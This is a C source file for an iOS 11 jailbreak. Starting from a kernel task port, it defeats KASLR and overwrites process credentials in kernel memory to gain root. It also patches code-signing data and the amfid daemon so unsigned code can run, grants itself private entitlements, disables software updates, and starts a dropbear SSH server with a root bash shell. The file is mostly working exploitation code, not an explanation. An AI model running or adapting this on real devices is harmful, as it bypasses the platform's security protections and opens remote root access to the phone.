//
//  jailbreak.c
//

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <err.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <copyfile.h>
#include <sys/fcntl.h>

#include "symbols.h"
#include "kmem.h"
#include "async_wake.h"
#include <pthread/pthread.h>
#include "cdhash.h"
#include "code_hiding_for_sanity.h"
#include <signal.h>
#include "webserver.h"
#include "sha256.h"
#include "remap_tfp0_to_hsp4.h"
#include "debugging.h"

#define EACCES 0xd

mach_port_t kernel_task_port = MACH_PORT_NULL;
uint64_t struct_proc_task_offset = 0x18;
uint64_t struct_task_itk_space_offset = 0x300;
uint64_t struct_ipc_space_is_table_offset = 0x20;
uint64_t struct_task_ref_count_offset = 0x10;
uint64_t current_process_pid;
uint64_t last_proc_impersonated;
uint64_t amfid_base;
mach_port_t amfid_exception_port = MACH_PORT_NULL;
uint64_t leaked_proc;
extern uint64_t kernel_leak;
extern uint64_t old_amfid_MISVSACI;
extern pthread_t exception_thread;
extern uint64_t kill_thread_flag;

void jailbreak(char* path, mach_port_t tfp0, int phone_type)
{
    char *app_path = malloc(strlen(path) + 1);
    char * new_entitlements = "\t<key>com.apple.private.kernel.system-override</key><true/>\n"
                            "\t<key>platform-application</key><true/>\n"
                            "\t<key>task_for_pid-allow</key><true/>\n"
                            "\t<key>com.apple.system-task-ports</key><true/>\n"
                            "\t<key>com.apple.private.xpc.service-configure</key><true/>\n"
                            "\t<key>com.apple.backboardd.debugapplications</key><true/>\n"
                            "\t<key>com.apple.backboardd.launchapplications</key><true/>\n"
                            "\t<key>com.apple.diagnosticd.diagnostic</key><true/>\n"
                            "\t<key>com.apple.frontboard.debugapplications</key><true/>\n"
                            "\t<key>com.apple.frontboard.launchapplications</key><true/>\n"
                            "\t<key>com.apple.security.network.client</key><true/>\n"
                            "\t<key>com.apple.security.network.server</key><true/>\n"
                            "\t<key>com.apple.springboard.debugapplications</key><true/>\n"
                            "\t<key>run-unsigned-code</key><true/>\n";
    kern_return_t kr;
    uint64_t old_creds = 0;
    int fd =0;
    strcpy(app_path, path);
    app_path[strlen(path) - 0x9] = 0; // truncate out the application name to give just the path
    printf("[!]\tJAILBREAK INITIALIZATION\n");
    printf("[i]\tPhone type %d\n", phone_type);
    uint64_t kernel_base = 0;
    if (phone_type == 0)
        kernel_base = dump_kernel(tfp0, 0xfffffff00760a0a0);
        // 15B202: iPhone 8,1 reversed from QiLin
    if (phone_type == 1)
        kernel_base = dump_kernel(tfp0, 0xFFFFFFF0076120A0);
        // 15B202: iPhone 6,1 reversed from QiLin
    if (phone_type == 2)
        kernel_base = dump_kernel(tfp0, 0xFFFFFFF0076220A0);
        // 15B202: iPhone 7,2 reversed from QiLin
    if (phone_type == 3)
        kernel_base = dump_kernel(tfp0, 0xFFFFFFF0076560A0);
    // 15B202: iPhone 9,3 reversed from QiLin
    uint64_t kaslr = kernel_base + 0xFF8FFC000; // offset of segment
    printf("[i]\tGot kaslr = 0x%llx\n", kaslr);
    printf("[+]\tAttempting to obtain root\n");
    printf("[i]\t\told:\n[i]\t\tuid=%d gid=%d euid=%d geuid=%d\n",
           (int)getuid(), (int)getgid(), (int)geteuid(), (int)getegid());
    if (give_me_root_privs(tfp0))
    {
        printf("[-]\tProblem getting root\n");
        free(app_path);
        return;
    }
    
    // overwrite the cred pointer with kern_task
    old_creds = rk64(get_proc_block(getpid())+0x100);
    wk64(get_proc_block(getpid())+0x100, rk64(get_proc_block(0)+0x100));
    uint32_t amfid_pid = get_pid_from_name("amfid");
    if (amfid_pid == 0xffffffff)
    {
        printf("[-]\tAMFI not running????? check /info (things are probably borked :( hmmm...)\n");
        free(app_path);
        return;
    }
    printf("[i]\tmy pid(%d) PCB @ 0x%llx\n", getpid(), get_proc_block(getpid()));
    printf("[i]\tkernel_task pid(%d) PCB @ 0x%llx\n", 0, get_proc_block(0));
    printf("[i]\tamfid pid(%d) PCB @ 0x%llx\n", amfid_pid, get_proc_block(amfid_pid));
    printf("[i]\tKernel base believed to start at 0x%llx\n", kernel_base);
    printf("[i]\t\tnew:\n[i]\t\tuid=%d gid=%d euid=%d geuid=%d\n", (int)getuid(), (int)getgid(), (int)geteuid(), (int)getegid());
    
    set_platform_attribs(get_proc_block(getpid()), tfp0);
    
    //remount the filesystem
    sleep(1);
    xerub_remount_code(kaslr, phone_type);
    uint32_t sys_pid = exec_wrapper("/usr/bin/sysdiagnose", "-u", NULL, NULL, NULL, NULL, tfp0);
    sleep(1);
    
    //We need to enable amfid to allow us to get a port to it
    printf("[i]\tAMFID pid == 0x%x\n", get_pid_from_name("amfid"));
    uint64_t amfid_task = get_proc_block(get_pid_from_name("amfid"));
    printf("[i]\tGot amfid pid at 0x%llx\n", amfid_task);
    uint64_t vnode_info = rk64(amfid_task+0x248);
    printf("[i]\tVNODE INFO : 0x%llx\n", vnode_info);
    uint64_t ubc_info = rk64(vnode_info+0xf*sizeof(uint64_t));
    printf("[i]\tMy UBC INFO is 0x%llx\n", ubc_info);
    uint64_t blob = rk64(ubc_info+0xa*sizeof(uint64_t));
    char *csb = malloc(0xa8);
    mach_vm_address_t sz = 0;
    mach_vm_read_overwrite(tfp0, (mach_vm_address_t)blob, 0xa8, (mach_vm_address_t)csb, &sz);
    printf("Current 0xa4 = 0x%02x\n", (int)*(char *)((char *)csb + 0xA4));
    *(char *)((char *)csb + 0xA4) = (*((char *)csb + 0xA4) & 0xFE) | 1;
    printf("New 0xa4 = 0x%02x\n", (int)*(char *)((char *)csb + 0xA4));
    printf("Current 0xc = 0x%04x\n", *(uint32_t *)((uint32_t *)csb + 0xc));
    *(uint32_t *)((uint32_t *)csb + 0xc) = *((uint32_t *)csb + 0xc) | htonl(0x22000005);
    printf("Current 0xc = 0x%04x\n", *(uint32_t *)((uint32_t *)csb + 0xc));
    mach_vm_write(tfp0, blob, (vm_offset_t)csb, 0xa8);
    free(csb);
    uint64_t sdProcStruct = get_proc_block(sys_pid);

    // change our entitlements so we can use task_for_pid
    modify_entitlements(new_entitlements, tfp0);
    wk64(get_proc_block(getpid())+0x100, rk64(sdProcStruct+0x100)); // overwrite the cred pointer with sys_diagnose
    kill(sys_pid, SIGSTOP);
    kill(sys_pid, SIGSTOP);
    sleep(1);
    kill(sys_pid, SIGSTOP);
    
    mach_port_name_t amfid_port = 0;
    kr = task_for_pid(mach_task_self(), get_pid_from_name("amfid"), &amfid_port);
    if (kr != KERN_SUCCESS)
    {
        printf("[-]\tTHERE WAS AN ERROR GETTING TFP for AMFID\n");
        free(app_path);
        return;
    }
    
    // patch amfid so that we can run unsigned code
    printf("[i]\tAMFID port = 0x%x\n", amfid_port);
    old_amfid_MISVSACI = patch_amfid(amfid_port);
    
    int fs_status = mkdir("/jailbreak", 0755);
    if (fs_status == EACCES)
    {
        printf("[-]\tThe filesystem wasn't properly remounted (%d) :/\n", fs_status);
        free(app_path);
        return;
    } else {
        printf("[+]\tThe filesystem was properly remounted!\n");
    }
    chdir("/jailbreak");
    
    
    char* old_jump_table = malloc(0x20);
    char* old_jump_table_entry = malloc(0x20);
    strcpy(old_jump_table, "/tmp/amfid.MISVSACI");
    sprintf(old_jump_table_entry, "0x%llx", old_amfid_MISVSACI);
    fd = open(old_jump_table, O_WRONLY | O_CREAT);
    write(fd, old_jump_table_entry, 0x20);
    close(fd);
    free(old_jump_table_entry);
    free(old_jump_table);
    
    // drop files into /jailbreak and /tmp
    copy_file_from_container(app_path, "bins.tar", "/tmp/bins.tar"); //TODO build your own binaries
    copy_file_from_container(app_path, "tar", "/jailbreak/tar");
    
    // this is me not wanting to deal with xcode signature failures from signed code
    // that isn't mine, tar was retrieved from http://newosxbook.com/tools/iOSBinaries.html
    fd = open("/jailbreak/tar", O_RDWR);
    write(fd, "\xcf\xfa\xed\xfe", 4);
    close(fd);
    chmod("/jailbreak/tar", 0755);
    
    // unpack the binaries
    sleep(1);
    exec_wrapper("/jailbreak/tar", "--keep-newer-files", "-xvf", "/tmp/bins.tar", 0, 0, tfp0); //--keep-newer-files
    sleep(5); // exec returns instantly, but actual file operations take some time so
              // sleep to make sure tar actually finishes
    exec_wrapper("/jailbreak/usr/bin/uname", "-a", 0, 0, 0, 0, tfp0);
    sleep(2);
    
    // set important permissions
    chmod("/jailbreak/bin/bash", 0755);
    chmod("/jailbreak/bin/launchctl", 0755);
    chmod("/jailbreak/usr/local/bin/dropbear", 0755);
    
    // stop auto-updating
    neuter_updates();
    
    // get ssh running
    copy_file_from_container(app_path, "dropbear.plist", "/tmp/dropbear.plist");
    chmod("/jailbreak/bin/launchctl", 0777);
    chmod("/tmp/dropbear.plist", 0400);
    chown("/tmp/dropbear.plist", 0, 0);
    exec_wrapper("/jailbreak/bin/launchctl", "print", "system", 0, 0, 0, tfp0);
    exec_wrapper("/jailbreak/bin/launchctl", "load", "/tmp/dropbear.plist", 0, 0, 0, tfp0);
    copyfile("/jailbreak/etc/motd", "/etc/motd", 0, 0xA);
    copy_file_from_container(app_path, "profile", "/var/root/.profile");
    mkdir("/etc/dropbear", 0755);

    
    //remap tfp0 to host special port 4 so that userspace programs can haz kernelz
    if (!copy_kernel_to_userspace(tfp0, kernel_base))
    {
        copy_userspace_kernel_to_file("/tmp/kernel_dump", kernel_base);
        //props to QiLin stek29 for suggesting this - https://github.com/stek29
        remap_tfp0_to_hsp4(tfp0, kernel_base);
    }
    cleanup_debugging();
    
    //fully nerfy amfid
    //exec_wrapper("/jailbreak/bin/nerfbat", 0, 0, 0, 0, 0, tfp0);
    
    //run the webserver from userspace
    char *kb = malloc(0x20);
    sprintf(kb, "0x%llx", kernel_base);
    copy_file_from_container(app_path, "ws.plist", "/tmp/ws.plist");
    chmod("/jailbreak/bin/launchctl", 0777);
    chmod("/tmp/ws.plist", 0400);
    chown("/tmp/ws.plist", 0, 0);
    exec_wrapper("/jailbreak/bin/launchctl", "print", "system", 0, 0, 0, tfp0);
    exec_wrapper("/jailbreak/bin/launchctl", "load", "/tmp/ws.plist", 0, 0, 0, tfp0);
    

    
    // run nerfbat
    copy_file_from_container(app_path, "nerfbat.plist", "/tmp/nerfbat.plist");
    chmod("/jailbreak/bin/launchctl", 0777);
    chmod("/tmp/nerfbat.plist", 0400);
    chown("/tmp/nerfbat.plist", 0, 0);
    exec_wrapper("/jailbreak/bin/launchctl", "print", "system", 0, 0, 0, tfp0);
    exec_wrapper("/jailbreak/bin/launchctl", "load", "/tmp/nerfbat.plist", 0, 0, 0, tfp0);
    
    
    sleep(3);
    exec_wrapper("/jailbreak/bin/ws", kb, 0, 0, 0, 0, tfp0);
    exec_wrapper("/jailbreak/usr/local/bin/dropbear", "-R", "--shell", "/jailbreak/bin/bash", 0, 0, tfp0);
    exec_wrapper("/jailbreak/bin/nerfbat", "die", 0, 0, 0, 0, tfp0);
    
    free(kb);
    sleep(3);

    // unpatching AMFID
    unpatch_amfid(amfid_port, old_amfid_MISVSACI);
    exec_wrapper("/jailbreak/bin/nerfbat", 0, 0, 0, 0, 0, tfp0);
    sleep(1);
    kill_thread_flag = 1;
    exec_wrapper("/jailbreak/bin/id", 0, 0, 0, 0, 0, tfp0);
    
    //printf("[+]\tReverting privs to avoid a crash...");
    //set_my_pid(old_creds);
    old_creds=old_creds;
    free(app_path);
    printf("[!]\tJailbreak terminating\n\n");
    return;
}
